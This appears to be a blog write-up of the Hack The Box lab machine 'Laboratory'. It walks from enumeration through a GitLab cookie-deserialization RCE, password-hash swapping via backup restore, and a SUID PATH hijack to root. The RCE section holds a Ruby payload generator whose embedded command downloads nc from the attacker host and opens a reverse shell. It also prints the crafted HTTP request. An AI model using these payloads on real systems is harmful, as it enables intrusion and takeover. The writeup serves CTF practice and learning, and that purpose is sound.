---
title: "HTB Laboratory"
date: 2020-11-26
layout: single
excerpt: "Writeup for an old box I did long ago called Laboratory"
classes: wide
header:
  teaser: "/assets/images/HTB_Laboratory/Laboratory.png"
  teaser_home_page: true
  #icon: "/assets/images/HTB_Laboratory"
categories:
  - HTB
tags:
  - Git-Lab
  - Apache
  - Brute Force
  - SUID
---


## Purpose: HTB Laboratory

I'm taking notes from an old HTB I did some time ago and going to try to do a writeup. Thus, expect some incompletness!

Laboratory is an easy box that leverages a gitlab RCE vulnerablity to pivot into a docker container. From there rewriting the SQL datebase hashes allows you login to gitlab as an admin user, and you can grab an ssh rsa key. With this key you can ssh into the docker host to grab user and then exploit a pathing mistake to trick a suid binary to give you a root shell.

## I begin by adding "laboratory.htb" to my hosts file
- This helps fix virtual hosting issues with web servers that sometimes messes things up if using a direct ip address 

## Next, I do a NMAP:

`nmap -sV -sC -oN Laboratory 10.129.40.119`

```bash

Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-16 11:06 UTC
Nmap scan report for 10.129.40.119
Host is up (0.15s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn:
|_  http/1.1
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.91 seconds

```

## Next I Enmurate WebPage at Port 443
- Found an Apache page
- After poking around, it seems like there are many places to login, but brute forcing seems to be out of the question since this box appears to be rate limiting requests (trust me on this, it took hours to figure this out)
- Found a gitlab prompt at `git.laboratory.htb` that appears to allow me to create a user account. I have to use **laboratory.htb** as my email provider however.
- This is nice, but as a basic user I don't seem to be able to do much.

## Enumerating OSINT and exploiting gitlab vulnerablities
- After some digging I found this: https://hackerone.com/reports/827052
  - This has two vulns, an LFI and an RCE (RCE is located in comments section, don't miss this like I did!)
- The LFI isn't very helpful since I don't seem to be able to read anything important, however the RCE could give me an shell.
- After some tinkering I found how to get a shell by:
  1. Downloading/Installing Ruby and using this payload generation script: (note, the correct playload I used is also displayed)

  ```ruby
  def genPayload()
        request = ActionDispatch::Request.new(Rails.application.env_config)
        request.env["action_dispatch.cookies_serializer"] = :marshal
        cookies = request.cookie_jar

        erb = ERB.new("<%= `curl --connect-timeout 3 10.10.14.31:443/nc > /tmp/nc; chmod +x /tmp/nc; /tmp/nc 10.10.14.31 3333 -/bin/sh` %>")
        depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
        cookies.signed[:cookie] = depr
        puts cookies[:cookie]
  end

  ```
  2. From above they playload downloads **nc** from my machine. Use python simple http server for this (run this in dir of nc):

  ```python
  python -m http.server 443
  ```
  3. After the script is ran with payload it will generate a cookie that you need to add to a burp web reqest. To run script: (Make sure you are logged on as the user you created for gitlab and use the gitlab-rails console to run) (if you don't do this under your user account, it will not generate the correct cookie!)

  ```bash
  load "/tmp/rails/payload.rb"
  genPayload
  ```
  4. Now paste this cookie in the following burp request after **Cookie: experimentation_subject_id=**: (don't forget to URL ENCODE)

  ```
  GET /users/sign_in HTTP/1.1
  Host: git.laboratory.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Referer: https://git.laboratory.htb/dashboard/snippets
  DNT: 1
  Connection: close
  Cookie: experimentation_subject_id=
  Cache-Control: max-age=0
  Content-Length: 6
  ```

  5. Now verify you have your python web server setup and nc is listening on your machine, then send the reqest away, this should return a reverse shell!

## Container Enumeration/Database overwrite

- Once Inisde the box I immediatly tried to get the user flag, however it was nowhere to be found. 
- The Environment looked limited so I guessed something was up, but at the time was more concertned about root access.
- After running some enum scripts I found that the gitlab database was writeable. Since I created my user account earlier I wanted to see if I could find my user and hash
- After some research I found that I could backup and restore gitlab:

```
gitlab-backup create
# Location of backups:
# /var/opt/gitlab/backups/
gitlab-backup restore
```

- Thus, I created a backup, downloaded the backup to my machine and copied my user hash over the "dexter" account's hash in the database, thus making my password dexter's password.
- After the restoring the backup on Laboratory.htb I found that I was able to login as dexter
- After snooping in dexter's account I found some private git repos, one of which contained a private RSA key:
![](/assets/images/HTB_Laboratory/20220709142023.png)  
![](/assets/images/HTB_Laboratory/20220709142048.png)  


## User and Root

- So I have an rsa key, so logged into box with

```
ssh -i id_rsa dexter@10.10.10.216
```
- Now with login as Dexter I was able to grab the **user.txt**
- Basic enumeration yielded that gitlab was indeed running in an container
- After some enumeration I was able to find an unusual binary called "docker-security", which had the suid set
- If the "strings" command is ran on this binary I was able to see that it calls the "chmod" binary to do something, however chomd is called with a realitive path, thus relying on the path variable. 
- Since the current environment has a path variable that is mutable I changed to the path to
```
PATH="/tmp/:$Path"
```
- And then setup a script called "chmod" in "/tmp":
```
#!/bin/bash
bash
```
- Now running "docker-secuirty" will yeild a root shell, thus grabbing **root.txt**


## Summary Map
NMAP --> Discovered https prots open --> Enmurated to find static site with a git lab site --> Tried logging in, failed --> enmurated some more to find a possible user name dexter --> used static page refs to find what dexter might use as a password --> started brut forcing git lab password --> failed due to rate limiting --> recalibrated --> figured out I could login as a user to gitlab (register) --> Enmurated exploit upon learning gitlab version via authenticated api --> found I could execute artbitualy file reads --> Enmuarated gitlab file sturture by creating mirred instance on my own vm --> downloaded serects.yml after researching its value --> enmuarted furthere exploits --> disocved rce with secrets.yml data --> generated malicouse cookie --> reverese shell --> enmurated system --> eventually discovered backup capability with permissions to execute --> made backup and transfered outside --> examined contents --> researched contents --> discovered hashes can be swapped --> copied over hash over the admin(dexter) with my registered account --> resetored backup --> logged into gitlab as admin(dexter) --> found hidden project contained ssh rsa private key --> enmurated system once more to find how to use rsa key --> found system was a docker container --> used rsa key to ssh into host machine as dexter --> user flag --> enmuarted system --> disovered custom SUID binary --> examined binary function and discovered it used releative paths for calls --> changed local user's path and created "custom" script to run in place of orginal call --> root

